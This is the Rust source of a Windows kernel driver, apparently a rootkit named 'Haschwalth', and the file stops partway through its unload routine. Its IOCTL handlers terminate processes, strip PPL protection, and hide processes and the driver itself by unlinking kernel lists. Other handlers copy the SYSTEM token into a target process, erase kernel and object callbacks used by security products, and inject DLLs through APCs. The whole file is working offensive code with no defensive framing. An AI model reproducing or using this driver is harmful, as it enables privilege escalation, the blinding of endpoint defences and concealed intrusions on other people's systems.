#![no_std]
extern crate alloc;
#[cfg(not(test))]
extern crate wdk_panic;
mod ffi;

use alloc::vec::Vec;
use core::ffi::c_void;
use core::mem;
#[cfg(not(test))]
use wdk_alloc::WdkAllocator;

#[cfg(not(test))]
#[global_allocator]
static GLOBAL_ALLOCATOR: WdkAllocator = WdkAllocator;

use ffi::{IoGetCurrentIrpStackLocation, KAPC_ENVIRONMENT, PKNORMAL_ROUTINE, ZwAllocateVirtualMemory, ExAllocatePool2, KeInsertQueueApc, KeInitializeApc, PsProcessType, PsThreadType};
use wdk::println;
use wdk_sys::ntddk::{IoCreateDevice, IoCreateSymbolicLink, IoDeleteDevice, IoDeleteSymbolicLink, IofCompleteRequest, KeStackAttachProcess, KeUnstackDetachProcess, MmGetSystemRoutineAddress, MmIsAddressValid, ObfDereferenceObject, PsLookupProcessByProcessId, RtlInitUnicodeString, ZwClose, ZwOpenProcess, ZwTerminateProcess};
use wdk_sys::{
    BOOLEAN, CLIENT_ID, DEVICE_OBJECT, DRIVER_OBJECT, FILE_ANY_ACCESS, FILE_DEVICE_UNKNOWN, HANDLE,
    IRP, IRP_MJ_CLOSE, IRP_MJ_CREATE, IRP_MJ_DEVICE_CONTROL, KAPC,KPROCESSOR_MODE,
    LIST_ENTRY, METHOD_BUFFERED, NTSTATUS, OBJECT_ATTRIBUTES, PCUNICODE_STRING, PEPROCESS, PETHREAD,
    PKAPC, PVOID, STATUS_BUFFER_TOO_SMALL, STATUS_INVALID_DEVICE_REQUEST,
    STATUS_INVALID_PARAMETER, STATUS_NOT_FOUND, STATUS_SUCCESS, STATUS_UNSUCCESSFUL,
    UNICODE_STRING, _IO_STACK_LOCATION,
};

const PROTECTION_OFFSET: usize = 0x87A;           // EPROCESS.Protection
const ACTIVE_PROCESS_LINK: usize = 0x448;         // EPROCESS.ActiveProcessLinks
const TOKEN_OFFSET: usize = 0x4b8;                // EPROCESS.Token
const THREAD_LIST_HEAD_OFFSET: usize = 0x5e0;     // EPROCESS.ThreadListHead
const ETHREAD_THREAD_LIST_ENTRY: usize = 0x4e8;   // ETHREAD.ThreadListEntry
const ETHREAD_MISC_FLAGS: usize = 0x74;           // ETHREAD.MiscFlags (campo Alertable)

const PS_PROTECTED_SYSTEM: u8 = 0x72;

pub const fn ctl_code(device_type: u32, function: u32, method: u32, access: u32) -> u32 {
    (device_type << 16) | (access << 14) | (function << 2) | method
}

const IOCTL_REQUIEM_TEST: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_REQUIEM_KILL_PROCESS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_REQUIEM_STRIP_PPL: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_REQUIEM_HIDE_PROCESS: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_REQUIEM_TOKEN_STEAL: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS);

const IOCTL_REQUIEM_ENUM_CALLBACKS: u32     = ctl_code(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_REQUIEM_REMOVE_CALLBACK: u32    = ctl_code(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_REQUIEM_INJECT_DLL: u32         = ctl_code(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_REQUIEM_PROTECT_PROCESS: u32    = ctl_code(FILE_DEVICE_UNKNOWN, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_REQUIEM_ENUM_OB_CALLBACKS: u32  = ctl_code(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_REQUIEM_REMOVE_OB_CALLBACK: u32 = ctl_code(FILE_DEVICE_UNKNOWN, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_REQUIEM_UNLINK_DRIVER: u32      = ctl_code(FILE_DEVICE_UNKNOWN, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS);

const OB_TYPE_CALLBACK_LIST_OFFSET: usize = 0xC8;
const OB_ENTRY_PARENT_OFFSET: usize   = 0x18;
const OB_ENTRY_PRE_OP_OFFSET: usize   = 0x28;
const OB_ENTRY_POST_OP_OFFSET: usize  = 0x30;

#[repr(C)]
struct PidRequest {
    pid: u64,
}

#[repr(C)]
#[derive(Clone, Copy)]
enum CallbackType {
    Process = 0,
    Thread  = 1,
    Image   = 2,
}

#[repr(C)]
struct CallbackEnumRequest {
    cb_type: u32,
    max_entries: u32,
}

#[repr(C)]
struct CallbackEntry {
    index: u32,
    routine: u64,
    module_base: u64,
    module_name: [u16; 64],
}

#[repr(C)]
struct CallbackEnumResponse {
    count: u32,
    entries: [CallbackEntry; 64],
}

#[repr(C)]
struct CallbackRemoveRequest {
    cb_type: u32,
    index: u32,
}

#[repr(C)]
struct InjectDllRequest {
    pid: u64,
    dll_path: [u8; 260],
}

#[repr(C)]
struct ObCallbackEnumRequest {
    object_type: u32, // 0=Process, 1=Thread
}

#[repr(C)]
struct ObCallbackEntry {
    index: u32,
    pre_operation: u64,
    post_operation: u64,
    parent: u64,
    list_entry: u64,
}

#[repr(C)]
struct ObCallbackEnumResponse {
    count: u32,
    entries: [ObCallbackEntry; 32],
}

#[repr(C)]
struct ObCallbackRemoveRequest {
    object_type: u32,
    index: u32,
}

fn create_unicode_vec(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(core::iter::once(0u16)).collect()
}

unsafe fn get_input_buffer<T>(irp: *mut IRP, stack: *mut _IO_STACK_LOCATION) -> Result<&'static T, NTSTATUS> { unsafe {
    let length = (*stack).Parameters.DeviceIoControl.InputBufferLength as usize;
    if length < mem::size_of::<T>() {
        return Err(STATUS_BUFFER_TOO_SMALL);
    }
    let buffer = (*irp).AssociatedIrp.SystemBuffer as *const T;
    if buffer.is_null() {
        return Err(STATUS_UNSUCCESSFUL);
    }
    Ok(&*buffer)
}}

unsafe fn get_output_buffer<T>(irp: *mut IRP, stack: *mut _IO_STACK_LOCATION) -> Result<&'static mut T, NTSTATUS> { unsafe {
    let length = (*stack).Parameters.DeviceIoControl.OutputBufferLength as usize;
    if length < mem::size_of::<T>() {
        return Err(STATUS_BUFFER_TOO_SMALL);
    }
    let buffer = (*irp).AssociatedIrp.SystemBuffer as *mut T;
    if buffer.is_null() {
        return Err(STATUS_UNSUCCESSFUL);
    }
    Ok(&mut *buffer)
}}

const MAX_CALLBACKS: usize = 64;

unsafe fn is_valid_callback_array(array: *mut u64) -> bool { unsafe {
    if MmIsAddressValid(array as *mut c_void) == 0 {
        return false;
    }

    let mut kernel_entries = 0usize;
    let mut bogus_entries = 0usize;

    for i in 0..MAX_CALLBACKS {
        let slot_ptr = array.add(i);
        if MmIsAddressValid(slot_ptr as *mut c_void) == 0 {
            break;
        }

        let raw = *slot_ptr;
        if raw == 0 {
            continue;
        }

        let block_addr = raw & !0xFu64;
        if block_addr >= 0xFFFF_8000_0000_0000u64 {
            kernel_entries += 1;
        } else {
            bogus_entries += 1;
        }
    }

    kernel_entries > 0 && bogus_entries == 0
}}

unsafe fn resolve_callback_array(routine_name: &str) -> Option<*mut u64> { unsafe {
    let mut name_us: UNICODE_STRING = mem::zeroed();
    let buf = create_unicode_vec(routine_name);
    RtlInitUnicodeString(&mut name_us, buf.as_ptr());

    let func = MmGetSystemRoutineAddress(&mut name_us) as *const u8;
    if func.is_null() {
        println!("[Haschwalth] [!] MmGetSystemRoutineAddress returned null for {}", routine_name);
        return None;
    }

    println!("[Haschwalth] [i] Scanning {} @ {:p}", routine_name, func);

    for i in 0..0x100usize {
        let p = func.add(i);

        let b0 = *p;
        let b1 = *p.add(1);
        let b2 = *p.add(2);

        // 48/4C 8D <mod>  -> lea r64, [rip+disp32]
        let is_lea = (b0 == 0x48 || b0 == 0x4C) && b1 == 0x8D
            && (b2 == 0x0D || b2 == 0x05 || b2 == 0x15 || b2 == 0x2D || b2 == 0x35);

        if is_lea {
            let disp = *(p.add(3) as *const i32);
            let target = p.add(7).offset(disp as isize) as *mut u64;
            if (target as usize) >= 0xFFFF_8000_0000_0000
                && MmIsAddressValid(target as *mut c_void) != 0
            {
                println!("[Haschwalth] [i] LEA candidate at offset {} -> {:p}", i, target);
                if is_valid_callback_array(target) {
                    println!("[Haschwalth] [i] Validated callback array at {:p}", target);
                    return Some(target);
                }
                println!("[Haschwalth] [!] Candidate rejected by validation, aborting scan");
                return None;
            }
        }
    }

    println!("[Haschwalth] [!] No LEA candidate found in {} bytes", 0x100);
    None
}}

unsafe fn callback_array_for(cb_type: CallbackType) -> Option<*mut u64> { unsafe {
    match cb_type {
        CallbackType::Process => resolve_callback_array("PsSetCreateProcessNotifyRoutineEx"),
        CallbackType::Thread  => resolve_callback_array("PsSetCreateThreadNotifyRoutine"),
        CallbackType::Image   => resolve_callback_array("PsSetLoadImageNotifyRoutine"),
    }
}}

unsafe fn find_module_for_address(_addr: u64, _driver: *mut DRIVER_OBJECT) -> (u64, [u16; 64]) {
    (0u64, [0u16; 64])
}

unsafe fn handle_enum_callbacks(
    irp: *mut IRP,
    stack: *mut _IO_STACK_LOCATION,
    driver: *mut DRIVER_OBJECT,
) -> NTSTATUS { unsafe {
    let req = match get_input_buffer::<CallbackEnumRequest>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };
    let resp = match get_output_buffer::<CallbackEnumResponse>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };

    let cb_type = match req.cb_type {
        0 => CallbackType::Process,
        1 => CallbackType::Thread,
        2 => CallbackType::Image,
        _ => return STATUS_INVALID_PARAMETER,
    };

    let array = match callback_array_for(cb_type) {
        Some(a) => a,
        None => return STATUS_NOT_FOUND,
    };

    println!("[Haschwalth] [i] Callback array @ {:p}", array);

    if MmIsAddressValid(array as *mut c_void) == 0 {
        println!("[Haschwalth] [!] Callback array pointer is not valid, aborting");
        return STATUS_UNSUCCESSFUL;
    }

    resp.count = 0;
    for i in 0..MAX_CALLBACKS {
        let slot_ptr = array.add(i);
        if MmIsAddressValid(slot_ptr as *mut c_void) == 0 {
            println!("[Haschwalth] [!] Slot {} not readable, stopping", i);
            break;
        }

        let raw = *slot_ptr;
        if raw == 0 {
            continue;
        }

        let block = (raw & !0xFu64) as *const u64;
        if block.is_null() {
            continue;
        }

        if MmIsAddressValid(block as *mut c_void) == 0 {
            println!("[Haschwalth] [!] Block at slot {} not valid (raw=0x{:X}), skipping", i, raw);
            continue;
        }

        let routine_ptr = block.add(1);
        if MmIsAddressValid(routine_ptr as *mut c_void) == 0 {
            println!("[Haschwalth] [!] Routine ptr at slot {} not valid, skipping", i);
            continue;
        }

        let routine = *routine_ptr;
        if routine == 0 {
            continue;
        }

        println!("[Haschwalth] [i] Slot {}: routine=0x{:X}", i, routine);

        let (base, name) = find_module_for_address(routine, driver);
        let idx = resp.count as usize;
        if idx >= 64 { break; }
        resp.entries[idx] = CallbackEntry {
            index: i as u32,
            routine,
            module_base: base,
            module_name: name,
        };
        resp.count += 1;
    }

    println!("[Haschwalth] [i] Enum done, count={}", resp.count);
    STATUS_SUCCESS
}}

unsafe fn handle_remove_callback(irp: *mut IRP, stack: *mut _IO_STACK_LOCATION) -> NTSTATUS { unsafe {
    let req = match get_input_buffer::<CallbackRemoveRequest>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };

    let cb_type = match req.cb_type {
        0 => CallbackType::Process,
        1 => CallbackType::Thread,
        2 => CallbackType::Image,
        _ => return STATUS_INVALID_PARAMETER,
    };

    let array = match callback_array_for(cb_type) {
        Some(a) => a,
        None => return STATUS_NOT_FOUND,
    };

    let idx = req.index as usize;
    if idx >= MAX_CALLBACKS {
        return STATUS_INVALID_PARAMETER;
    }

    let slot = array.add(idx);
    if *slot == 0 {
        return STATUS_NOT_FOUND;
    }

    println!("[Haschwalth] [i] Removing callback {} ({}=Proc/1=Thread/2=Image)", idx, req.cb_type);

    *slot = 0;

    STATUS_SUCCESS
}}

unsafe fn handle_protect_process(irp: *mut IRP, stack: *mut _IO_STACK_LOCATION) -> NTSTATUS { unsafe {
    let request = match get_input_buffer::<PidRequest>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };

    if request.pid == 0 || request.pid == 4 {
        return STATUS_INVALID_PARAMETER;
    }

    let mut process: PEPROCESS = core::ptr::null_mut();
    let status = PsLookupProcessByProcessId(request.pid as HANDLE, &mut process);
    if status != STATUS_SUCCESS {
        return status;
    }

    println!(
        "[Haschwalth] [i] Applying PS_PROTECTED_SYSTEM (0x{:02X}) on pid {}",
        PS_PROTECTED_SYSTEM, request.pid
    );

    let protection_ptr = (process as *mut u8).add(PROTECTION_OFFSET);
    *protection_ptr = PS_PROTECTED_SYSTEM;

    ObfDereferenceObject(process as *mut c_void);
    STATUS_SUCCESS
}}


const MEM_COMMIT_RESERVE: u32 = 0x1000 | 0x2000;
const PAGE_READWRITE: u32 = 0x04;

unsafe extern "system" fn kernel_apc_rundown(
    apc: PKAPC,
    _normal_routine: *mut PKNORMAL_ROUTINE,
    _normal_context: *mut PVOID,
    _system_argument1: *mut PVOID,
    _system_argument2: *mut PVOID,
) {
    let _ = apc;
}

unsafe fn find_alertable_thread(process: PEPROCESS) -> Option<PETHREAD> { unsafe {
    let head = (process as *mut u8).add(THREAD_LIST_HEAD_OFFSET) as *mut LIST_ENTRY;
    let mut cur = (*head).Flink;

    let mut iters = 0;
    while cur != head && iters < 1024 {
        let ethread = (cur as *mut u8).sub(ETHREAD_THREAD_LIST_ENTRY) as PETHREAD;

        let flags_byte = *((ethread as *mut u8).add(ETHREAD_MISC_FLAGS));
        let alertable = (flags_byte & 0x10) != 0;

        if alertable {
            return Some(ethread);
        }

        cur = (*cur).Flink;
        iters += 1;
    }
    None
}}

#[repr(C)]
struct InjectDllRequestExt {
    pid: u64,
    load_library_addr: u64,
    dll_path: [u8; 260],
}

unsafe fn handle_inject_dll(irp: *mut IRP, stack: *mut _IO_STACK_LOCATION) -> NTSTATUS { unsafe {
    let req = match get_input_buffer::<InjectDllRequestExt>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };

    if req.pid == 0 || req.pid == 4 || req.load_library_addr == 0 {
        return STATUS_INVALID_PARAMETER;
    }

    let path_len = req.dll_path.iter().position(|&b| b == 0).unwrap_or(260);
    if path_len == 0 || path_len >= 260 {
        return STATUS_INVALID_PARAMETER;
    }

    let mut process: PEPROCESS = core::ptr::null_mut();
    let status = PsLookupProcessByProcessId(req.pid as HANDLE, &mut process);
    if status != STATUS_SUCCESS {
        return status;
    }

    println!("[Haschwalth] [i] DLL injection into pid {}", req.pid);

    let mut apc_state: [u8; 0x30] = [0; 0x30];
    KeStackAttachProcess(process, apc_state.as_mut_ptr() as *mut _);

    let nt_current_process: HANDLE = -1isize as HANDLE;
    let mut base: PVOID = core::ptr::null_mut();
    let mut size: usize = path_len + 1;
    let alloc_status = ZwAllocateVirtualMemory(
        nt_current_process,
        &mut base,
        0,
        &mut size,
        MEM_COMMIT_RESERVE,
        PAGE_READWRITE,
    );

    if alloc_status != STATUS_SUCCESS || base.is_null() {
        KeUnstackDetachProcess(apc_state.as_mut_ptr() as *mut _);
        ObfDereferenceObject(process as *mut c_void);
        return alloc_status;
    }

    core::ptr::copy_nonoverlapping(req.dll_path.as_ptr(), base as *mut u8, path_len);
    *((base as *mut u8).add(path_len)) = 0;

    KeUnstackDetachProcess(apc_state.as_mut_ptr() as *mut _);

    let target_thread = match find_alertable_thread(process) {
        Some(t) => t,
        None => {
            println!("[Haschwalth] [!] No alertable thread found");
            ObfDereferenceObject(process as *mut c_void);
            return STATUS_NOT_FOUND;
        }
    };

    const POOL_FLAG_NON_PAGED: u64 = 0x40;
    const HASCHWALTH_TAG: u32 = u32::from_le_bytes(*b"Hsch");

    let apc_ptr = ExAllocatePool2(
        POOL_FLAG_NON_PAGED,
        mem::size_of::<KAPC>(),
        HASCHWALTH_TAG,
    ) as PKAPC;
    if apc_ptr.is_null() {
        ObfDereferenceObject(process as *mut c_void);
        return STATUS_UNSUCCESSFUL;
    }
    
    const USER_MODE: KPROCESSOR_MODE = 1;

    unsafe extern "system" fn kernel_cleanup_routine(
        _apc: *mut wdk_sys::KAPC,
        _normal_routine: *mut PKNORMAL_ROUTINE,
        _normal_context: *mut *mut c_void,
        _sys_arg1: *mut *mut c_void,
        _sys_arg2: *mut *mut c_void,
    ) {
        println!("[Haschwalth] [!] Kernel_cleanup_routine");
    }

    KeInitializeApc(
        apc_ptr,
        target_thread,
        KAPC_ENVIRONMENT::OriginalApcEnvironment,
        Some(kernel_cleanup_routine),
        None,
        mem::transmute(req.load_library_addr),
        1,
        base as *mut c_void,
    );

    let inserted = KeInsertQueueApc(apc_ptr, core::ptr::null_mut(), core::ptr::null_mut(), 0);
    if inserted == 0 {
        ObfDereferenceObject(process as *mut c_void);
        return STATUS_UNSUCCESSFUL;
    }

    ObfDereferenceObject(process as *mut c_void);
    STATUS_SUCCESS
}}

unsafe fn handle_enum_ob_callbacks(
    irp: *mut IRP,
    stack: *mut _IO_STACK_LOCATION,
) -> NTSTATUS { unsafe {
    let req = match get_input_buffer::<ObCallbackEnumRequest>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };
    let resp = match get_output_buffer::<ObCallbackEnumResponse>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };

    let object_type_ptr: *mut c_void = match req.object_type {
        0 => *PsProcessType,
        1 => *PsThreadType,
        _ => return STATUS_INVALID_PARAMETER,
    };

    if object_type_ptr.is_null() {
        return STATUS_NOT_FOUND;
    }
    if MmIsAddressValid(object_type_ptr) == 0 {
        return STATUS_UNSUCCESSFUL;
    }

    let head = (object_type_ptr as *mut u8).add(OB_TYPE_CALLBACK_LIST_OFFSET) as *mut LIST_ENTRY;
    println!("[Haschwalth] [i] OB callback list head @ {:p}", head);

    resp.count = 0;
    let mut current = (*head).Flink;
    let mut iters = 0;

    while !current.is_null() && current != head && iters < 32 {
        if MmIsAddressValid(current as *mut c_void) == 0 {
            println!("[Haschwalth] [!] Invalid LIST_ENTRY at iter {}", iters);
            break;
        }

        let entry = current as *mut u8;
        let pre_op  = *(entry.add(OB_ENTRY_PRE_OP_OFFSET)  as *const u64);
        let post_op = *(entry.add(OB_ENTRY_POST_OP_OFFSET) as *const u64);
        let parent  = *(entry.add(OB_ENTRY_PARENT_OFFSET)  as *const u64);

        let idx = resp.count as usize;
        if idx >= 32 { break; }

        resp.entries[idx] = ObCallbackEntry {
            index: iters as u32,
            pre_operation: pre_op,
            post_operation: post_op,
            parent,
            list_entry: current as u64,
        };
        resp.count += 1;

        println!(
            "[Haschwalth] [i] OB cb {}: pre=0x{:X} post=0x{:X}",
            iters, pre_op, post_op
        );

        current = (*current).Flink;
        iters += 1;
    }

    println!("[Haschwalth] [i] OB enum done, count={}", resp.count);
    STATUS_SUCCESS
}}

unsafe fn handle_remove_ob_callback(
    irp: *mut IRP,
    stack: *mut _IO_STACK_LOCATION,
) -> NTSTATUS { unsafe {
    let req = match get_input_buffer::<ObCallbackRemoveRequest>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };

    let object_type_ptr: *mut c_void = match req.object_type {
        0 => *PsProcessType,
        1 => *PsThreadType,
        _ => return STATUS_INVALID_PARAMETER,
    };

    if object_type_ptr.is_null() || MmIsAddressValid(object_type_ptr) == 0 {
        return STATUS_NOT_FOUND;
    }

    let head = (object_type_ptr as *mut u8).add(OB_TYPE_CALLBACK_LIST_OFFSET) as *mut LIST_ENTRY;
    let mut current = (*head).Flink;
    let mut idx: u32 = 0;

    while !current.is_null() && current != head && idx < 32 {
        if MmIsAddressValid(current as *mut c_void) == 0 {
            break;
        }

        if idx == req.index {
            let entry = current as *mut u8;
            *(entry.add(OB_ENTRY_PRE_OP_OFFSET)  as *mut u64) = 0;
            *(entry.add(OB_ENTRY_POST_OP_OFFSET) as *mut u64) = 0;
            println!("[Haschwalth] [i] OB callback {} disabled (Pre/Post NULLed)", idx);
            return STATUS_SUCCESS;
        }

        current = (*current).Flink;
        idx += 1;
    }

    STATUS_NOT_FOUND
}}

unsafe fn handle_unlink_driver(driver: *mut DRIVER_OBJECT) -> NTSTATUS { unsafe {
    let driver_section = (*driver).DriverSection;
    if driver_section.is_null() {
        println!("[Haschwalth] [!] DriverSection is null");
        return STATUS_NOT_FOUND;
    }

    let links = driver_section as *mut LIST_ENTRY;
    let next = (*links).Flink;
    let prev = (*links).Blink;

    if next.is_null() || prev.is_null() {
        return STATUS_INVALID_PARAMETER;
    }

    println!("[Haschwalth] [i] Unlinking driver (DriverSection={:p})", driver_section);

    (*next).Blink = prev;
    (*prev).Flink = next;
    (*links).Flink = links;
    (*links).Blink = links;

    println!("[Haschwalth] [i] Driver unlinked from PsLoadedModuleList");
    STATUS_SUCCESS
}}

unsafe fn handle_test_ioctl(irp: *mut IRP, stack: *mut _IO_STACK_LOCATION) -> NTSTATUS { unsafe {
    let input_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u8;
    let input_length = (*stack).Parameters.DeviceIoControl.InputBufferLength as usize;

    if !input_buffer.is_null() && input_length > 0 {
        let input_slice = core::slice::from_raw_parts(input_buffer, input_length);
        if let Ok(message) = core::str::from_utf8(input_slice) {
            println!("\n[Haschwalth] [i] Received message: {}", message);
        }
        return STATUS_SUCCESS;
    }
    STATUS_UNSUCCESSFUL
}}

unsafe fn handle_kill_process(irp: *mut IRP, stack: *mut _IO_STACK_LOCATION) -> NTSTATUS { unsafe {
    let request = match get_input_buffer::<PidRequest>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };

    let target_pid = request.pid as HANDLE;

    println!("\n[Haschwalth] [i] Killing process with pid: {:?}", target_pid);

    let mut process: PEPROCESS = core::ptr::null_mut();
    let mut status = PsLookupProcessByProcessId(target_pid, &mut process);

    if status == STATUS_SUCCESS {
        let mut handle = core::ptr::null_mut();
        let mut client_id = CLIENT_ID {
            UniqueProcess: target_pid,
            UniqueThread: core::ptr::null_mut(),
        };
        let mut obj_attr: OBJECT_ATTRIBUTES = mem::zeroed();

        status = ZwOpenProcess(&mut handle, 0x0001, &mut obj_attr, &mut client_id);
        if status == STATUS_SUCCESS {
            status = ZwTerminateProcess(handle, 0);
            ZwClose(handle);
        }
        ObfDereferenceObject(process as *mut c_void);
    }
    status
}}

unsafe fn handle_strip_ppl(irp: *mut IRP, stack: *mut _IO_STACK_LOCATION) -> NTSTATUS { unsafe {
    let request = match get_input_buffer::<PidRequest>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };

    let mut process: PEPROCESS = core::ptr::null_mut();
    let status = PsLookupProcessByProcessId(request.pid as HANDLE, &mut process);

    if status == STATUS_SUCCESS {
        println!("[Haschwalth] [i] Stripping PPL from process with pid: {:?}", request.pid);
        let protection_ptr = (process as *mut u8).add(PROTECTION_OFFSET);
        *protection_ptr = 0;
        ObfDereferenceObject(process as *mut c_void);
    }
    status
}}

unsafe fn handle_hide_process(irp: *mut IRP, stack: *mut _IO_STACK_LOCATION) -> NTSTATUS { unsafe {
    let request = match get_input_buffer::<PidRequest>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };

    let mut process: PEPROCESS = core::ptr::null_mut();
    let status = PsLookupProcessByProcessId(request.pid as HANDLE, &mut process);

    if status == STATUS_SUCCESS {
        println!("\n[Haschwalth] [i] Hiding process with pid: {:?}", request.pid);

        let links = (process as *mut u8).add(ACTIVE_PROCESS_LINK) as *mut LIST_ENTRY;
        let next = (*links).Flink;
        let prev = (*links).Blink;

        (*next).Blink = prev;
        (*prev).Flink = next;
        (*links).Flink = links;
        (*links).Blink = links;

        ObfDereferenceObject(process as *mut c_void);
    }
    status
}}

unsafe fn handle_token_steal(irp: *mut IRP, stack: *mut _IO_STACK_LOCATION) -> NTSTATUS { unsafe {
    let request = match get_input_buffer::<PidRequest>(irp, stack) {
        Ok(r) => r,
        Err(e) => return e,
    };

    let mut routine_name: UNICODE_STRING = mem::zeroed();
    // global variable who points to EPROCESS structure for the system process
    let routine_buf = create_unicode_vec("PsInitialSystemProcess");
    RtlInitUnicodeString(&mut routine_name, routine_buf.as_ptr());

    let proc_addr = MmGetSystemRoutineAddress(&mut routine_name);
    if proc_addr.is_null() {
        return STATUS_UNSUCCESSFUL;
    }

    let mut target_process: PEPROCESS = core::ptr::null_mut();
    let status = PsLookupProcessByProcessId(request.pid as HANDLE, &mut target_process);

    if status == STATUS_SUCCESS {
        let system_eprocess = *(proc_addr as *mut PEPROCESS);
        let system_token_ptr = (system_eprocess as *mut u8).add(TOKEN_OFFSET) as *mut usize;
        let system_token_clean = *system_token_ptr & !0xF;

        let target_token_ptr = (target_process as *mut u8).add(TOKEN_OFFSET) as *mut usize;
        *target_token_ptr = system_token_clean;

        ObfDereferenceObject(target_process as *mut c_void);
    }
    status
}}


#[unsafe(export_name = "DriverEntry")]
pub unsafe extern "system" fn driver_entry(
    driver: &mut DRIVER_OBJECT,
    _registry_path: PCUNICODE_STRING,
) -> NTSTATUS { unsafe {
    println!("[Haschwalth] [i] Initializing Haschwalth");

    fn utf16z(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(core::iter::once(0u16)).collect()
    }

    let mut dv_name: UNICODE_STRING = mem::zeroed();
    let device_name_buf = utf16z(r"\Device\Haschwalth");
    RtlInitUnicodeString(&mut dv_name, device_name_buf.as_ptr());

    let mut sb_name: UNICODE_STRING = mem::zeroed();
    let sym_name_buf = utf16z(r"\DosDevices\Haschwalth");
    RtlInitUnicodeString(&mut sb_name, sym_name_buf.as_ptr());

    let mut device_object: *mut DEVICE_OBJECT = core::ptr::null_mut();
    let status = IoCreateDevice(
        driver,
        0,
        &mut dv_name,
        FILE_DEVICE_UNKNOWN,
        0,
        BOOLEAN::from(false),
        &mut device_object,
    );
    if status != STATUS_SUCCESS {
        return status;
    }

    let status = IoCreateSymbolicLink(&mut sb_name, &mut dv_name);
    if status != STATUS_SUCCESS {
        IoDeleteDevice(device_object);
        return status;
    }

    driver.MajorFunction[IRP_MJ_CREATE as usize] = Some(dispatch_create_close);
    driver.MajorFunction[IRP_MJ_CLOSE as usize] = Some(dispatch_create_close);
    driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] = Some(dispatch_device_control);
    driver.DriverUnload = Some(driver_exit);

    STATUS_SUCCESS
}}

pub unsafe extern "C" fn dispatch_create_close(
    _device_object: *mut DEVICE_OBJECT,
    irp: *mut IRP,
) -> NTSTATUS { unsafe {
    (*irp).IoStatus.Information = 0;
    (*irp).IoStatus.__bindgen_anon_1.Status = STATUS_SUCCESS;
    IofCompleteRequest(irp, 0);
    STATUS_SUCCESS
}}

pub unsafe extern "C" fn dispatch_device_control(
    _device_object: *mut DEVICE_OBJECT,
    irp: *mut IRP,
) -> NTSTATUS { unsafe {
    let stack = IoGetCurrentIrpStackLocation(irp);
    if stack.is_null() {
        return STATUS_UNSUCCESSFUL;
    }

    let ioctl_code = (*stack).Parameters.DeviceIoControl.IoControlCode;
    let mut bytes_returned = 0usize;

    let driver = (*_device_object).DriverObject;

    let status = match ioctl_code {
        IOCTL_REQUIEM_TEST            => handle_test_ioctl(irp, stack),
        IOCTL_REQUIEM_KILL_PROCESS    => { let s = handle_kill_process(irp, stack); bytes_returned = mem::size_of::<PidRequest>(); s },
        IOCTL_REQUIEM_STRIP_PPL       => { let s = handle_strip_ppl(irp, stack); bytes_returned = mem::size_of::<PidRequest>(); s },
        IOCTL_REQUIEM_HIDE_PROCESS    => { let s = handle_hide_process(irp, stack); bytes_returned = mem::size_of::<PidRequest>(); s },
        IOCTL_REQUIEM_TOKEN_STEAL     => { let s = handle_token_steal(irp, stack); bytes_returned = mem::size_of::<PidRequest>(); s },
        IOCTL_REQUIEM_ENUM_CALLBACKS  => { let s = handle_enum_callbacks(irp, stack, driver); if s == STATUS_SUCCESS { bytes_returned = mem::size_of::<CallbackEnumResponse>(); } s },
        IOCTL_REQUIEM_REMOVE_CALLBACK => { let s = handle_remove_callback(irp, stack); bytes_returned = 0; s },
        IOCTL_REQUIEM_INJECT_DLL      => { let s = handle_inject_dll(irp, stack); bytes_returned = 0; s },
        IOCTL_REQUIEM_PROTECT_PROCESS => { let s = handle_protect_process(irp, stack); bytes_returned = mem::size_of::<PidRequest>(); s },
        IOCTL_REQUIEM_ENUM_OB_CALLBACKS => { let s = handle_enum_ob_callbacks(irp, stack); if s == STATUS_SUCCESS { bytes_returned = mem::size_of::<ObCallbackEnumResponse>(); } s },
        IOCTL_REQUIEM_REMOVE_OB_CALLBACK => handle_remove_ob_callback(irp, stack),
        IOCTL_REQUIEM_UNLINK_DRIVER => handle_unlink_driver(driver),
        _ => STATUS_INVALID_DEVICE_REQUEST,
    };

    (*irp).IoStatus.__bindgen_anon_1.Status = status;
    (*irp).IoStatus.Information = bytes_returned as u64;
    IofCompleteRequest(irp, 0);
    status
}}

unsafe extern "C" fn driver_exit(driver: *mut DRIVER_OBJECT) { unsafe {

    fn utf16z(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(core::iter::once(0u16)).collect()
    }

    let mut sb_name: UNICODE_STRING = mem::zeroed();
    let sym_name_buf = utf16z(r"\DosDevices\Haschwalth");
    RtlInitUnicodeString(&mut sb_name, sym_name_buf.as_ptr());

